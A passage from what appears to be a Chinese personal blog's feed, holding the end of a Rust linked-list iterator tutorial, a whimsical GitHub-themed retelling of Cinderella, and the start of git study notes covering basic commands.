punctuation">(</span>iter<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>iter<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">None</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>取出来的是数值，接下来要实现的有：一个迭代器结构体IntoIter，迭代器特征，以及List结构体的构造迭代器的方法<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">/*……*/</span><span class="token keyword">pub</span> <span class="token keyword">struct</span> <span class="token type-definition class-name">IntoIter</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*……*/</span>    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">into_iter</span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">IntoIter</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">&#123;</span>        <span class="token class-name">IntoIter</span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token comment">/*……*/</span><span class="token keyword">impl</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">></span> <span class="token class-name">Iterator</span> <span class="token keyword">for</span> <span class="token class-name">IntoIter</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">&#123;</span>    <span class="token keyword">type</span> <span class="token type-definition class-name">Item</span> <span class="token operator">=</span> <span class="token class-name">T</span><span class="token punctuation">;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">next</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token keyword">Self</span><span class="token punctuation">::</span><span class="token class-name">Item</span><span class="token operator">></span><span class="token punctuation">&#123;</span>        <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token number">0</span><span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>IntoIter是一个元组结构体，类型是一个List，也就是一个指针</p><p>Into的版本在迭代时也把链表清空了，而下一个Iter，返回一个不可变引用，就没有这个问题了，为了展现这一特点，测试写成这样：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[test]</span><span class="token keyword">fn</span> <span class="token function-definition function">test_iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> list <span class="token operator">=</span> <span class="token class-name">List</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> iter <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>iter<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>iter<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>iter<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>iter<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">None</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        iter <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>iter<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>要实现的东西不变，一个结构体定义，一个特征，一个方法<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">struct</span> <span class="token type-definition class-name">Iter</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'a</span><span class="token punctuation">,</span> <span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">&#123;</span>    next<span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token operator">&amp;</span><span class="token lifetime-annotation symbol">'a</span> <span class="token class-name">Node</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">>></span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token comment">/*List*/</span>    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">iter</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Iter</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'_</span><span class="token punctuation">,</span> <span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">&#123;</span>        <span class="token class-name">Iter</span><span class="token punctuation">&#123;</span>            next<span class="token punctuation">:</span> <span class="token keyword">self</span><span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>node<span class="token closure-punctuation punctuation">|</span></span> <span class="token operator">&amp;</span><span class="token operator">*</span><span class="token operator">*</span>node<span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/*other code*/</span>    <span class="token keyword">impl</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'a</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token operator">></span> <span class="token class-name">Iterator</span> <span class="token keyword">for</span> <span class="token class-name">Iter</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'a</span><span class="token punctuation">,</span> <span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">&#123;</span>    <span class="token keyword">type</span> <span class="token type-definition class-name">Item</span> <span class="token operator">=</span><span class="token operator">&amp;</span><span class="token lifetime-annotation symbol">'a</span> <span class="token class-name">T</span><span class="token punctuation">;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">next</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token keyword">Self</span><span class="token punctuation">::</span><span class="token class-name">Item</span><span class="token operator">></span><span class="token punctuation">&#123;</span>        <span class="token keyword">self</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>node<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>            <span class="token keyword">self</span><span class="token punctuation">.</span>next <span class="token operator">=</span> node<span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>node<span class="token closure-punctuation punctuation">|</span></span> <span class="token operator">&amp;</span><span class="token operator">*</span><span class="token operator">*</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span>node<span class="token punctuation">.</span>val        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>因为涉及到了引用，所以编译器撂挑子了，把生命周期的难题还了回来，不过在此之前，<code>&amp;**node</code>实在是丑陋，其表示对node做两次解引用再返回其引用，可以用<code>as_deref</code>简化：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">iter</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Iter</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'_</span><span class="token punctuation">,</span> <span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">&#123;</span>    <span class="token class-name">Iter</span><span class="token punctuation">&#123;</span>        next<span class="token punctuation">:</span> <span class="token keyword">self</span><span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">as_deref</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">fn</span> <span class="token function-definition function">next</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token keyword">Self</span><span class="token punctuation">::</span><span class="token class-name">Item</span><span class="token operator">></span><span class="token punctuation">&#123;</span>    <span class="token keyword">self</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>node<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">self</span><span class="token punctuation">.</span>next <span class="token operator">=</span> node<span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">as_deref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>node<span class="token punctuation">.</span>val    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>简洁多了</p><p>引用的生命周期要保证引用活得不能比其本体久，在iter函数中就是返回的迭代器活得不长于self，也就是链表头。<br>在迭代器特征的实现中，要保证self至少和Item活得一样久</p><p>接下来是更复杂一点的可变借用IterMut，测试：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[test]</span><span class="token keyword">fn</span> <span class="token function-definition function">test_iter_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> list <span class="token operator">=</span> <span class="token class-name">List</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> val <span class="token keyword">in</span> list<span class="token punctuation">.</span><span class="token function">iter_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token operator">*</span>val <span class="token operator">*=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> iter <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>iter<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>iter<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>iter<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">struct</span> <span class="token type-definition class-name">IterMut</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'a</span><span class="token punctuation">,</span> <span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">&#123;</span>    next<span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token operator">&amp;</span><span class="token lifetime-annotation symbol">'a</span> <span class="token keyword">mut</span> <span class="token class-name">Node</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">>></span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token comment">//……</span>    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">iter_mut</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">IterMut</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'_</span><span class="token punctuation">,</span> <span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">&#123;</span>        <span class="token class-name">IterMut</span><span class="token punctuation">&#123;</span>            next<span class="token punctuation">:</span> <span class="token keyword">self</span><span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">as_deref_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//……</span><span class="token keyword">impl</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'a</span><span class="token punctuation">,</span> <span class="token class-name">T</span><span class="token operator">></span> <span class="token class-name">Iterator</span> <span class="token keyword">for</span> <span class="token class-name">IterMut</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'a</span><span class="token punctuation">,</span> <span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">&#123;</span>    <span class="token keyword">type</span> <span class="token type-definition class-name">Item</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token lifetime-annotation symbol">'a</span> <span class="token keyword">mut</span> <span class="token class-name">T</span><span class="token punctuation">;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">next</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token keyword">Self</span><span class="token punctuation">::</span><span class="token class-name">Item</span><span class="token operator">></span><span class="token punctuation">&#123;</span>        <span class="token keyword">self</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>node<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>            <span class="token keyword">self</span><span class="token punctuation">.</span>next <span class="token operator">=</span> node<span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">as_deref_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token keyword">mut</span> node<span class="token punctuation">.</span>val        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>可变引用的难点在于同时只能有一个，是不可copy的，所以在next函数中要使用take()获取值</p><p>至此，一个很基本的链表就算是完成了，难怪不建议新手尝试😵‍💫</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;已经学习rust一周了，是时候尝试一下链表了&lt;/p&gt;
&lt;p&gt;按照TDD的规范，先写第一个测试：&lt;br&gt;&lt;pre class=&quot;line-numbers language-rust&quot; data-language=&quot;rust&quot;&gt;&lt;code</summary>
        
      
    
    
    
    <category term="从0开始的rust之旅" scheme="https://aucept.in/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84rust%E4%B9%8B%E6%97%85/"/>
    
    
    <category term="rust" scheme="https://aucept.in/tags/rust/"/>
    
    <category term="链表" scheme="https://aucept.in/tags/%E9%93%BE%E8%A1%A8/"/>
    
  </entry>
  
  <entry>
    <title>睡前故事：灰姑娘</title>
    <link href="https://aucept.in/2025/08/14/%E7%81%B0%E5%A7%91%E5%A8%98/"/>
    <id>https://aucept.in/2025/08/14/%E7%81%B0%E5%A7%91%E5%A8%98/</id>
    <published>2025-08-14T14:33:25.000Z</published>
    <updated>2025-08-18T12:38:01.750Z</updated>
    
    <content type="html"><![CDATA[<p>在 GitHub 的茫茫仓库海洋里，有一个默默无闻的小姑娘。</p><p>她每天在继姐们的项目里修复小 bug、写小脚本或是回应issue，push 的 commit 总是埋在深深的 pull request 里，很少有人关注。她自己的仓库几乎空无一物，只有几个 watch，却存放着她暗暗打磨的梦想功能。</p><p>她的继姐们是开源圈的活跃账号，项目多到像星辰般闪耀，每一次 release 都引来成百上千的 stars。每次 Hackathon，继姐们总能被王子们邀请成为核心贡献者，而她只能在旁边默默看着。</p><p>由于账号十分简陋她被姐姐们与继母称为“灰姑娘”</p><p>一天，GitHub 王国宣布将举办一场盛大的 Hackathon 舞会，邀请所有开发者提交 Pull Request，为王子最爱的明星项目添砖加瓦。</p><p>灰姑娘想去，但她的电脑老旧，IDE 卡顿，连本地测试都运行得慢（注：即使这样也不会手写代码算结果的！）。她望着自己的 repo，轻叹：“我连参加舞会的资格都没有。”</p><p>就在这时，一个神秘的窗口出现在了显示器上，加载变换出一位仙女。</p><p>“你要去舞会吗？”仙女评论，带着调皮的 emoji。</p><p>“我……我想去，但环境不行。”灰姑娘回复。</p><p>仙女运行了一个魔法脚本，远程给她配置了最先进的云端开发环境，送给她一双“水晶鞋”——一个魔法般的 Personal Access Token，让她能轻松在王子的项目里提交 PR、合并分支，就像在舞会上自由舞动一般。</p><p>“记住，”这是仙女的最后一句话，在屏幕上闪着光，“这个开发环境只能用到午夜，过了时间，权限就会消失。”</p><p>舞会开始了。灰姑娘带着“水晶鞋”，在 Hackathon 中提交了第一个 PR。</p><p>她的代码像水晶一样透明优雅，函数命名温柔而精准，commit message 优美到像情诗。王子浏览了成百上千的提交，终于停在了她的 PR 上。</p><blockquote><p>“This is the most elegant code I’ve ever seen. Who are you?”</p></blockquote><p>王子在评论里留下这句惊叹。</p><p>灰姑娘的心怦怦跳，但午夜钟声逼近，Personal Access Token 开始闪烁红色警告——权限即将失效。</p><p>她连忙 merge 自己的分支 pull 到自己的仓库，却还是被迫下线，GitHub 显示 “This user is offline”。PR 留下的唯一线索，是那条闪亮的 commit hash，像水晶鞋遗落在王子的世界里。</p><p>王子焦急地遍寻整个仓库，试图找到她的身份。他发出公告：</p><p>“谁能用这个 hash 复现同样优雅的代码，我就与谁共建项目。”</p><p>能和王子共建项目，意味着大量的star与无上的荣誉，王国里的每个人都跃跃欲试。</p><p>灰姑娘的姐姐们也不例外，她们拼命地穷举SHA-1，寄希望于找到符合哈希的代码，却注定徒劳，只得到了几个接近的。</p><p>起初，王子看到相似的commit哈希，立刻想把灰姑娘的姐姐加为新项目的collaborator，可他仔细一看，commit的内容就像一坨base64，完全没有可读性，哈希值也不完全一样</p><p>就在此时，灰姑娘向王子push了她的commit，完美复现了那段逻辑，一模一样的SHA-1。王子见了，立刻高兴地喊到：“我找到了，你就是我要找的collaborator”</p><p>自那以后，他们开始互相 follow，star 对方的仓库，review 对方的提交。每一次 merge、每一次 commit，都像悄悄写下的情书。</p><p>随着时间流逝，灰姑娘不再默默无闻，她的仓库渐渐亮起了星光。王子在自己的 README 里写下：</p><blockquote><p>“Special thanks to the one who made every release better.”</p></blockquote><p>最终，他们成为项目的核心维护者，每天都在彼此的 commit history 里留下痕迹，他们维护的分支，就像他们的感情，纠缠交织、难舍难分。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;在 GitHub 的茫茫仓库海洋里，有一个默默无闻的小姑娘。&lt;/p&gt;
&lt;p&gt;她每天在继姐们的项目里修复小 bug、写小脚本或是回应issue，push 的 commit 总是埋在深深的 pull request 里，很少有人关注。她自己的仓库几乎空无一物，只有几个</summary>
        
      
    
    
    
    <category term="睡前故事" scheme="https://aucept.in/categories/%E7%9D%A1%E5%89%8D%E6%95%85%E4%BA%8B/"/>
    
    
    <category term="睡前故事" scheme="https://aucept.in/tags/%E7%9D%A1%E5%89%8D%E6%95%85%E4%BA%8B/"/>
    
  </entry>
  
  <entry>
    <title>git 学习笔记</title>
    <link href="https://aucept.in/2025/08/11/git-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://aucept.in/2025/08/11/git-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2025-08-11T13:16:09.000Z</published>
    <updated>2025-10-09T06:05:04.713Z</updated>
    
    <content type="html"><![CDATA[<p>内容来源：</p><ul><li>书名：Git从入门到精通</li><li>作者：高见龙</li><li>出版社：北京大学出版社<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="设置用户信息"><a href="#设置用户信息" class="headerlink" title="设置用户信息"></a>设置用户信息</h3><code>git config --global user.name &quot;Auceptin&quot;</code></li></ul><p><code>git config --global user.email &quot;me@aucept.in&quot;</code> </p><p><code>git config --list</code>可以查看当前设置</p><p>如果想为某个项目设定单独的作者，把global参数换成local</p><h3 id="设置别名（缩写）"><a href="#设置别名（缩写）" class="headerlink" title="设置别名（缩写）"></a>设置别名（缩写）</h3><p><code>git config --global alias.co checkout</code>这样就可以让co等同于checkout</p><p>也可以直接去/.gitconfig文件里改</p><h2 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h2><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p><code>git init</code>在项目目录里执行，初始化git，生成一个隐藏的./git文件夹，里面有git生效的全部信息</p><h3 id="获取状态"><a href="#获取状态" class="headerlink" title="获取状态"></a>获取状态</h3><p><code>git status</code>拿手头的项目试一下：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"> D:<span class="token punctuation">\</span>steam<span class="token punctuation">\</span>steamapps<span class="token punctuation">\</span>common<span class="token punctuation">\</span>Noita<span class="token punctuation">\</span>mods<span class="token punctuation">\</span>Noita_Kirous<span class="token operator">></span> <span class="token function">git</span> statusOn branch masterYour branch is up to <span class="token function">date</span> with <span class="token string">'origin/master'</span><span class="token builtin class-name">.</span>Changes not staged <span class="token keyword">for</span> commit:  <span class="token punctuation">(</span>use <span class="token string">"git add &lt;file>..."</span> to update what will be committed<span class="token punctuation">)</span>  <span class="token punctuation">(</span>use <span class="token string">"git restore &lt;file>..."</span> to discard changes <span class="token keyword">in</span> working directory<span class="token punctuation">)</span>        modified:   files/enemy/animal_maggot_tiny_mode/endless/level_endless/death.lua                                                                                                no changes added to commit <span class="token punctuation">(</span>use <span class="token string">"git add"</span> and/or <span class="token string">"git commit -a"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>当前所在分支，版本状态和未提交的修改内容</p><h3 id="提交"><a href="#提交" class="headerlink" title="提交"></a>提交</h3><p>一切修改都在工作目录里完成，而完成提交需要先转移到暂存区，再转移到存储库中。</p><p>注意：Git在计算、产生对象时，是根据“文件的内容”进行计算的，所以只是新增一个目录的话，Git是无法处理它的。</p><p>将修改的文件加入暂存区：</p><p><code>git add filename.md</code>，支持通配符<code>git add *.md</code>，或者<code>git add .</code>把当前目录下的所有加进暂存区，或者<code>git add --all</code>，把整个项目文件都加进去</p><p>提交到存储库：</p><p><code>git commit -m &quot;改动描述&quot;</code>改动描述默认是必须的，否则需要<code>--allow-empty</code>参数</p><p>合并add和commit可以<code>git commit -a -m &quot;update content&quot;</code>，增加一个-a参数，但是只适用于存储库中已有文件的修改，对新加入的文件无效</p><h3 id="查看历史"><a href="#查看历史" class="headerlink" title="查看历史"></a>查看历史</h3><p>git会保留一个项目的历史信息，从github上pull下来后也默认有这些信息</p><p><code>git log</code>查看每一次提交的信息，这一环节是推荐用图形化界面看的，因为清晰。大部分IDE都有集成git图形化的功能</p><p>筛选某个作者的提交<code>git log --oneline --author=&quot;Sherly&quot;</code>可以使用<code>|</code>或符号，但是需要加上转义，像这样<code>git log --oneline --author=&quot;Sherly\|Eddie&quot;</code></p><p>筛选提交描述词<code>git log --oneline --grep=&quot;LOL&quot;</code></p><p>按时间筛选<code>git log --oneline --since=&quot;9am&quot; --until=&quot;12am&quot; --after=&quot;2017-01&quot;</code></p><p>查看单独一个文件<code>git log welcome.html</code></p><h3 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h3><p>方案一是删除文件后把该文件提交到暂存区，两个步骤，也可以用<code>git rm filename</code></p><p>以上工作目录里对应文件也会一并删掉，如果只想从暂存区里删掉，不动工作目录<code>git rm welcome --cached</code>用—cached参数</p><h3 id="改文件名"><a href="#改文件名" class="headerlink" title="改文件名"></a>改文件名</h3><p>直观的方式仍然是在工作目录直接改名再提交，本质是删一个文件再加一个文件，也可以用<code>git mv hello.html world.html</code>把hello.html改成world.html</p><p><strong>文件的名称不重要</strong>，Git是根据文件的“内容”来计算SHA-1的值，所以文件的名称不重要，重要的是文件的内容。当更改文件名时，Git并不会为此做出一个新的Blob对象，而只是指向原来的那个Blob对象。但因为文件名变了，所以Git会为此做出一个新的Tree对象</p><h3 id="修改commit描述内容"><a href="#修改commit描述内容" class="headerlink" 